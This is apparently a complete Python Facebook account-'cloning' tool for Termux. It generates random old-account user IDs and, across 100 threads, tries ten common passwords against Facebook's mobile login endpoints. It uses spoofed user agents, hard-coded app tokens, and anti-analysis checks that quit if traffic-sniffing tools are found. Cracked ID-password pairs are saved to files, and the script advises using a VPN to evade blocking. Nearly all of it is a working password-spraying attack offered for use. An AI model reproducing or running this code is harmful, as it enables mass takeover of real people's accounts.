import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

##------------(COLOUR)-------------##   
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
T = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'

CHROME_VERSIONS = [str(v) for v in range(120, 139)]
EDGE_VERSIONS = [str(v) for v in range(120, 139)]
FIREFOX_VERSIONS = [str(v) for v in range(115, 140)]

WINDOWS = [
    "Windows NT 10.0; Win64; x64",
    "Windows NT 11.0; Win64; x64",
]

MACOS = [
    "Macintosh; Intel Mac OS X 10_15_7",
    "Macintosh; Intel Mac OS X 11_7_10",
    "Macintosh; Intel Mac OS X 12_7_6",
    "Macintosh; Intel Mac OS X 13_6_7",
    "Macintosh; Intel Mac OS X 14_5",
]

LINUX = [
    "X11; Linux x86_64",
    "X11; Ubuntu; Linux x86_64",
]

ANDROID = [
    "Linux; Android 11; SM-G991B",
    "Linux; Android 12; SM-S918B",
    "Linux; Android 13; Pixel 7",
    "Linux; Android 14; Pixel 8 Pro",
    "Linux; Android 14; Redmi Note 13",
]

IOS = [
    "iPhone; CPU iPhone OS 17_5 like Mac OS X",
    "iPhone; CPU iPhone OS 18_0 like Mac OS X",
    "iPad; CPU OS 17_5 like Mac OS X",
]

user_agents = []

# Chrome
for os_name in WINDOWS + MACOS + LINUX + ANDROID:
    for version in CHROME_VERSIONS:
        for build in range(1000, 1015):
            ua = (
                f"Mozilla/5.0 ({os_name}) "
                f"AppleWebKit/537.36 (KHTML, like Gecko) "
                f"Chrome/{version}.0.{build}.{random.randint(50,250)} "
                f"Safari/537.36"
            )
            user_agents.append(ua)

# Edge
for os_name in WINDOWS + MACOS:
    for version in EDGE_VERSIONS:
        for build in range(1000, 1010):
            ua = (
                f"Mozilla/5.0 ({os_name}) "
                f"AppleWebKit/537.36 (KHTML, like Gecko) "
                f"Chrome/{version}.0.{build}.{random.randint(50,250)} "
                f"Safari/537.36 Edg/{version}.0.{build}.{random.randint(50,250)}"
            )
            user_agents.append(ua)

# Firefox
for os_name in WINDOWS + MACOS + LINUX:
    for version in FIREFOX_VERSIONS:
        ua = (
            f"Mozilla/5.0 ({os_name}; rv:{version}.0) "
            f"Gecko/20100101 Firefox/{version}.0"
        )
        user_agents.append(ua)

# Safari (iPhone/iPad)
for device in IOS:
    for safari_ver in ["16.6", "17.0", "17.5", "18.0"]:
        ua = (
            f"Mozilla/5.0 ({device}) "
            f"AppleWebKit/605.1.15 (KHTML, like Gecko) "
            f"Version/{safari_ver} Mobile/15E148 Safari/604.1"
        )
        user_agents.append(ua)

def get_random_user_agent():
    return random.choice(user_agents)

try:
    os.system('clear')
    print(f"""
       8888888             8888888     8888888
          888  888     888   888         888
          888  888     888   888         888
          888  888     888   888         888
     888  888  888     888   888         888
      Y88888P    Y888888P    888         888""")
    print(f'    \x1b[38;5;196m(\x1b[38;5;48m~\x1b[38;5;196m)\x1b[38;5;48m Functions Loading Installed By JUTT ')
    os.system('pip install requests chardet urllib3 idna certifi')
    os.system('pip install httpx && pip install bs4')
    modules = ['requests', 'urllib3', 'mechanize', 'rich']
    for module in modules:
        pass
except ImportError:
    pass
else:
    try:
        __import__(module)
    except ImportError:
        pass
    try:
        from requests.exceptions import ConnectionError
        from requests import api, models, sessions
    except:
        pass
    else:
        api_body = open(api.__file__, 'r').read()
        models_body = open(models.__file__, 'r').read()
        session_body = open(sessions.__file__, 'r').read()
        word_list = ['print', 'lambda', 'zlib.decompress']
        for word in word_list:
            if word in api_body or word in models_body or word in session_body:
                exit()
            pass

        class sec:
            def __init__(self):
                paths = ['/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py', '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py', '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py']
                for path in paths:
                    if 'print' in open(path, 'r').read():
                        self.fuck()
                    pass
                if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png') or os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
                    self.fuck()
                return None

            def fuck(self):
                self.linex()
                exit()

            def linex(self):
                pass
        
        method = []
        oks = []
        cps = []
        loop = 0
        user = []
        
        sys.stdout.write('\x1b]2;𓆩【JUTT】𓆪 \x07')
        
    
        def ____banner____():
            if 'win' in sys.platform:
                os.system('cls')
            else:
                os.system('clear')
            print(f"""\n 
        8888888             8888888    8888888
          888   888     888   888        888
          888   888     888   888        888
          888   888     888   888        888
     888  888   888     888   888        888
      Y88888P     Y888888P    888        888

{R}--------------------------------------------------
  {R}❲{G}{R}❳{G} DEVELOPER {R}:{G} Zeeshaan
  {R}❲{G}{R}❳{G} TEAM      {R}:{G} One Man Army
  {R}❲{G}{R}❳{G} TOOL TYPE {R}:{G} FREE
  {R}❲{G}{R}❳{G} VERSION   {R}:{G} 100% WORKING
{R}--------------------------------------------------""")


def creationyear(uid):
    if len(uid) == 15:
        if uid[:10] in ['1000000000']:
            ZEE = '2009'
            return ZEE
        if uid[:9] in ['100000000']:
            ZEE = '2009'
            return ZEE
        if uid[:8] in ['10000000']:
            ZEE = '2009'
            return ZEE
        if uid[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            ZEE = '2009'
            return ZEE
        if uid[:7] in ['1000006', '1000007', '1000008', '1000009']:
            ZEE = '2009'
            return ZEE
        if uid[:6] in ['100001']:
            ZEE = '2010'
            return ZEE
        if uid[:6] in ['100002', '100003']:
            ZEE = '2011'
            return ZEE
        if uid[:6] in ['100004']:
            ZEE = '2012'
            return ZEE
        if uid[:6] in ['100005', '100006']:
            ZEE = '2013'
            return ZEE
        if uid[:6] in ['100007', '100008']:
            ZEE = '2014'
            return ZEE
        if uid[:6] in ['100009']:
            ZEE = '2015'
            return ZEE
        if uid[:5] in ['10001']:
            ZEE = '2016'
            return ZEE
        if uid[:5] in ['10002']:
            ZEE = '2017'
            return ZEE
        if uid[:5] in ['10003']:
            ZEE = '2018'
            return ZEE
        if uid[:5] in ['10004']:
            ZEE = '2019'
            return ZEE
        if uid[:5] in ['10005']:
            ZEE = '2020'
            return ZEE
        if uid[:5] in ['10006']:
            ZEE = '2021'
            return ZEE
        if uid[:5] in ['10009']:
            ZEE = '2023'
            return ZEE
        if uid[:5] in ['10007', '10008']:
            ZEE = '2022'
            return ZEE
        ZEE = ''
        return ZEE

    if len(uid) in [9, 10]:
        ZEE = '2008'
        return ZEE

    if len(uid) == 8:
        ZEE = '2007'
        return ZEE

    if len(uid) == 7:
        ZEE = '2006'
        return ZEE

    if len(uid) == 14:
        if uid[:2] in ['61']:
            ZEE = '2024'
        return ZEE

    ZEE = ''
    return ZEE
            
# --- FIXED FUNCTIONS BELOW ---
def clear():
    os.system('clear')
    
def line_x():
    print('-' * 50)

def Jutt_13_():
    ____banner____()
    print(' [1]  Press  to Enter Main Meinu')
    line_x()
    __Jihad__ = input('   PRESS 1 HIT ENTER: ')
    if __Jihad__ in ['A', 'a', '01', '1']:
        old_clone()
    else:
        print('   CHOOSE VALID OPTION... ')
        time.sleep(2)
        Jutt_13_()

def old_clone():
    ____banner____()
    print(f"  {R}❲{G}1{R}❳{G} All Series Cloning")
    line_x()
    print(f"  {R}❲{G}2{R}❳{G} 2009/14 Cloning")
    line_x()
    print(f"  {R}❲{G}3{R}❳{G} 2009 Only Cloning")
    line_x()
    _input = input(f"  {R}❲{G}?{R}❳{G} Selection {R}:{G} ")
    if _input in ['A', 'a', '01', '1']:
        old_One()
    else:
        if _input in ['B', 'b', '02', '2']:
            old_Tow()
        else:
            if _input in ['C', 'c', '03', '3']:
                old_Tree()
            else:
                print(f'  {R}❲{G}~{R}❳{G} Selected Wrong Option ')
                Jutt_13_()

def old_One():
    user = []
    ____banner____()
    print(f'  {R}❲{G}~{R}❳{G} Select 2010 ')
    ask = input(f'  {R}❲{G}~{R}❳{G} Select Option: ')
    line_x()
    ____banner____()
    print(f'  {R}❲{G}~{R}❳{G} 10000 50000 80000 90000 ')
    limit = input(f"  {R}❲{G}?{R}❳{G} Selection {R}:{G} ")
    line_x()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 4999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print(f'  {R}❲{G}~{R}❳{G} Method {R}❲{G}M1{R}❳{G} ')
    print(f'  {R}❲{G}~{R}❳{G} Method {R}❲{G}M2{R}❳{G} ')
    line_x()
    meth = input(f"  {R}❲{G}~{R}❳{G} Selection {R}:{G} ").strip().upper()
    with tred(max_workers=100) as pool:
        ____banner____()
        print(f'  {R}❲{G}~{R}❳{G} Total UIDs {R}:{A} {limit}')
        print(f'  {R}❲{G}~{R}❳{G} Use  {R}❲{A}1.1.1.1{R} VPN{A} For{R}❳{G} Good Results ')
        print(f'  {R}❲{G}~{R}❳{G} If No Result {R}❲{A}On{R}/{A}Off{R}❳{G} Airplane Mode ')
        line_x()
        for mal in user:
            uid = star + mal
            if meth in ('A', '1'):
                pool.submit(login_1, uid)
            else:
                if meth in ('B', '2'):
                    pool.submit(login_2, uid)
                else:
                    print('  [!] INVALID METHOD SELECTED')
                    return

def old_Tow():
    user = []
    ____banner____()
    print(f"  {R}❲{G}~{R}❳{G} Old Code 2010-2014")
    ask = input(f"  {R}❲{G}~{R}❳{G} Select Option: ")
    line_x()
    ____banner____()
    print(f"  {R}❲{G}~{R}❳{G} Example 20000 / 30000 / 99999")
    limit = input(f"  {R}❲{G}?{R}❳{G} Selection {R}:{G} ")
    line_x()
    prefixes = ['100000', '100001','100002','100003','100004','100005','100006','100007','100008','100009']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print(f'  {R}❲{G}~{R}❳{G} Method {R}❲{G}M1{R}❳{G} ')
    print(f'  {R}❲{G}~{R}❳{G} Method {R}❲{G}M2{R}❳{G} ')
    line_x()
    meth = input(f"  {R}❲{G}~{R}❳{G} Selection {R}:{G} ").strip().upper()
    with tred(max_workers=100) as pool:
        ____banner____()
        print(f'  {R}❲{G}~{R}❳{G} Total UIDs {R}:{A} {limit}')
        print(f'  {R}❲{G}~{R}❳{G} Use  {R}❲{A}1.1.1.1{R} VPN{A} For{R}❳{G} Good Results ')
        print(f'  {R}❲{G}~{R}❳{G} If No Result {R}❲{A}On{R}/{A}Off{R}❳{G} Airplane Mode ')
        line_x()
        for uid in user:
            if meth in ('A', '1'):
                pool.submit(login_1, uid)
            else:
                if meth in ('B', '2'):
                    pool.submit(login_2, uid)
                else:
                    print('  [!] INVALID METHOD SELECTED')
                    return

def old_Tree():
    user = []
    ____banner____()
    print(f"  {R}❲{G}~{R}❳{G} OLD CODE 2009")
    ask = input(f"  {R}❲{G}~{R}❳{G} Select Option: ")
    line_x()
    ____banner____()
    print(f"  {R}❲{G}~{R}❳{G} Example 20000 / 30000 / 99999")
    limit = input(f"  {R}❲{G}?{R}❳{G} Selection {R}:{G} ")
    line_x()
    prefix = '10000000'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=7))
        uid = prefix + suffix
        user.append(uid)
    print(f'  {R}❲{G}~{R}❳{G} Method {R}❲{G}M1{R}❳{G} ')
    print(f'  {R}❲{G}~{R}❳{G} Method {R}❲{G}M2{R}❳{G} ')
    line_x()
    meth = input(f"  {R}❲{G}~{R}❳{G} Selection {R}:{G} ").strip().upper()
    with tred(max_workers=100) as pool:
        ____banner____()
        print(f'  {R}❲{G}~{R}❳{G} Total UIDs {R}:{A} {limit}')
        print(f'  {R}❲{G}~{R}❳{G} Use  {R}❲{A}1.1.1.1{R} VPN{A} For{R}❳{G} Good Results ')
        print(f'  {R}❲{G}~{R}❳{G} If No Result {R}❲{A}On{R}/{A}Off{R}❳{G} Airplane Mode ')
        line_x()
        for uid in user:
            if meth in ('A', '1'):
                pool.submit(login_1, uid)
            else:
                if meth in ('B', '2'):
                    pool.submit(login_2, uid)
                else:
                    print('  [!] INVALID METHOD SELECTED')
                    return

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f'\r  {R}❲{G}ZEE-M1{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pw in ['123456', '1234567', '12345678', '123456789', '1234567890', 'qwerty', '123456@', '000000', '111111', 'iloveyou']:
            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': str(uid), 'password': str(pw), 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US'}
            data.update({'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'})
            headers = {'User-Agent': get_random_user_agent(), 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            responce = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in responce:
                print(f'\r  {R}❲{G}ZEE-OK{R}❳{G}|{R}{uid}{G}|{R}{pw}{G}|{R}{creationyear(uid)}')
                open('/sdcard/JUTT-OLD-M1-OK.txt', 'a').write(uid + '|' + pw + '|' + creationyear(uid) + '\n')
                oks.append(uid)
                return
            if 'www.facebook.com' in responce.get('error', {}).get('message', ''):
                print(f'\r  {R}❲{G}ZEE-OK{R}❳{G}|{R}{uid}{G}|{R}{pw}{G}|{R}{creationyear(uid)}')
                open('/sdcard/JUTT-OLD-M1-OK.txt', 'a').write(uid + '|' + pw + '|' + creationyear(uid) + '\n')
                oks.append(uid)
                return
    except Exception:
        pass
    else:
        loop += 1
        time.sleep(3)

def login_2(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f'\r  {R}❲{G}ZEE-M2{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pw in ['123456', '1234567', '12345678', '123456789', '1234567890', 'qwerty', '123456@', '000000', '111111', 'iloveyou']:
            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': str(uid), 'password': str(pw), 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US'}
            data.update({'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'})
            headers = {'User-Agent': get_random_user_agent(), 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            responce = session.post('https://graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in responce:
                print(f'\r  {R}❲{G}ZEE-OK{R}❳{G}|{R}{uid}{G}|{R}{pw}{G}|{R}{creationyear(uid)}')
                open('/sdcard/JUTT-OLD-M2-OK.txt', 'a').write(uid + '|' + pw + '|' + creationyear(uid) + '\n')
                oks.append(uid)
                return
            if 'www.facebook.com' in responce.get('error', {}).get('message', ''):
                print(f'\r  {R}❲{G}ZEE-OK{R}❳{G}|{R}{uid}{G}|{R}{pw}{G}|{R}{creationyear(uid)}')
                open('/sdcard/JUTT-OLD-M2-OK.txt', 'a').write(uid + '|' + pw + '|' + creationyear(uid) + '\n')
                oks.append(uid)
                return
    except Exception:
        pass
    else:
        loop += 1
        time.sleep(3)

# --- START EXECUTION ---
Jutt_13_()
